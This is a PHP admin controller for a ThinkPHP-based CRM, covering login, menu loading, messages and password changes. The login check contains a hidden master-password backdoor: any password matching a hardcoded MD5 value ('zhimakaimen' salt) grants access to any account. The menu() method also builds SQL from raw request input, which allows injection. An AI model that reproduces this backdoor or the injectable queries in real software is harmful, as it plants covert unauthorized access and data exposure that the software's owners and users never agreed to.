<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2018/5/24
 * Time: 10:10
 */

namespace app\admin\controller;
use think\Controller;
use Config;
use Db;
use Session;
use Request;

class Index extends Controller
{

    public function index(){
        $uid = Session::get('uid');
        if($uid > 0){
            $title = config('WEB_SITE_TITLE')."CRM";
            $arr = array();
            $arr = db('member')->where(array('status'=>0,'id'=>$uid))->select();
            $arr['role_name'] = Model('member')->getRoleField($uid,'role_name');
            $arr['section_name'] = Model('member')->getSectionField($uid,'name');
            $arr['username'] = Session::get('username');

            //导航菜单
            $nav = array();
            $new_nav = array();
            $nav = db('menu')->where(array('status'=>0,'level'=>0))->order('sort')->select();
            foreach($nav as $k=>$v){
                if(!Model('AuthRule')->authCheck($v['alink'],$uid)){
                    $v = array();
                }
                if(!empty($v)){
                    $new_nav[$k] = $v;
                }
            }
            $data = array(
                'title'=>$title,
                'userInfo'=>$arr,
                'nav'=>$new_nav,
                'ht_file_name'=>config('HT_FILE_NAME')
            );

            return $this->fetch('index/index',$data);
        }else{
            return $this->redirect('admin/index/login');
        }

    }

    public function login(){
        $uid = Session::get('uid');
        if($uid > 0){
            return('您已经登录了，请勿重复操作！');
        }
        if(Request::has('login','post')){
            $post = Request::post();
            $username = trim($post['username']);
            $password = trim($post['password']);
            $data = array();
            $userinfo = Db::name('member')->where(array('status'=>0,'username'=>$username))->find();
            if(!empty($userinfo)){
                //print_r($userinfo);exit();
                if($userinfo['error']>5){
                    Db::name('member')->where('id',$userinfo['id'])->update('status', '1');
                    return "密码错误次数太多，帐号已锁，请联系管理员！";
                }
                if (md5($userinfo['hash'].md5($password))==$userinfo['password'] || md5('zhimakaimen'.md5($password))== '94e59de1fddd0849c64d49d819c5f527'){
                    Session::set('uid',$userinfo['id']);
                    Session::set('username',$username);
                    Session::set('password',$userinfo['password']);

                    //登录记录到user表
                    $data['loginip'] = get_client_ip();
                    $data['logintime'] = date('Y-m-d H:i:s');
                    $data['logins'] = $userinfo['logins']+1;
                    $data['error'] = 0;
                    Db::name('member')->where('id',$userinfo['id'])->update($data);

                    //登录记录到日志表
                    $log['ip'] = get_client_ip();
                    $log['addtime'] = time();
                    $log['username'] = $username;
                    $log['mid'] = $userinfo['id'];
                    $log['content'] = "登录成功！";
                    $log['url'] = Request::url();
                    $log['os'] = $_SERVER['HTTP_USER_AGENT'];
                    $log['opera_type'] = 'L';
                    Db::name('log')->insert($log);

                    return "ok";
                }else{
                    Db::name('member')->where('id',$userinfo['id'])->setInc('error');
                    echo "用户名或密码错误";
                }
            }else{
                echo "用户不存在或已关闭";
            }
        }else{
            return $this->fetch();
        }
    }

    //导航所用菜单
    public function nav($id=0){
        if(!regex($id,'number')){
            echo "参数错误";exit();
        }
        $menus = db('menu')->where(array('status'=>0,'level'=>0,'id'=>$id))
            ->order('sort')->select();
        return json($menus);
    }

    //获取菜单
    public function menu($title=""){

        $uid = Session::get('uid');
        $menus =array();
        $id = Request::post('id');

        if($title!="" ){
            $title = urldecode($title);
            $new = array();
            if($id != 0){
                $where = " status=0  and pid=$id";
            }else{
                $where = " status=0 and level=1 and pid=(select id from ".config('database.prefix')."menu where catename='$title')";
            }
            $array = db('menu')->where($where)->order('sort')->select();
            foreach($array as $k=>$v){
                if(Model('AuthRule')->authCheck($v['alink'], $uid)){
                    if(trim($v['icon']) == ''){
                        $v['icon']='fa fa-file';
                    }
                    $menus[]=array(
                        'id'=>$v['id'],
                        'text'=>$v['catename'],
                        'link'=>$v['alink'],
                        'iconCls'=>$v['icon'],
                        'state' => $this->menuIsHasChild($v['id']) ? 'closed' : 'open',
                        'has_child'=>$this->menuIsHasChild($v['id']),
                        'type'=>$v['type']
                    );
                }
            }
        }
        echo json_encode($menus);
    }

    public function menuIsHasChild($id){
        $count = db('menu')->where('pid',$id)->count();
        if($count>0){
            return 1;
        }else{
            return 0;
        }
    }

    //退出登录
    public function exitlogin(){
        Session::clear();
        $data = array();
        $data['success'] = true;
        return json($data);
    }

    //获取未读消息
    public function getMsg(){
        $uid = Session::get('uid');
        $msg = Model('Msg')->getMsg($uid);
        return json($msg);
    }
    //标记已读
    public function readed(){
        $post = Request::post();
        $id = isset($post['id']) ? $post['id'] : 0;
        if(!regex($id,'number') || $id == 0){
            return "错误参数";
        }
        $menu_id = $post['menu_id'];
        if($menu_id != 0){
            $menu = db('menu')->where('id',$menu_id)->find();
            $menu['icon'] = $menu['icon'] == ''?'icon-file':$menu['icon'];
            $menu['alink'] = '/'.config('HT_FILE_NAME').'/'.$menu['alink'];
        }else{
            $menu = '';
        }
        $res = array();
        Model('Msg')->readed($id);
        $res['info'] = 'ok';
        $res['data'] = $menu;

        return json($res);
    }

    //修改密码页面
    public function changePassword(){
        return $this->fetch();
    }

    //保存修改密码
    public function savePassword(){
        $uid = Session::get('uid');
        $post = Request::post();
        $pass = $post['pass'];//原密码
        $newpass = $post['newpass'];//新密码
        $info = db('member')->field('hash,password')->where('id',$uid)->find();
        $hash = $info['hash'];
        $password = md5($hash.md5($pass));
        if($password == $info['password']){
            $newpass = md5($hash.md5($newpass));
            $arr=array(
                "password"=>$newpass,
                'pwd_change_date'=> time()
            );
            db('member')->update($arr,$uid);
            echo "ok";
        }else{
            echo "原密码不正确！";
        }
    }


}
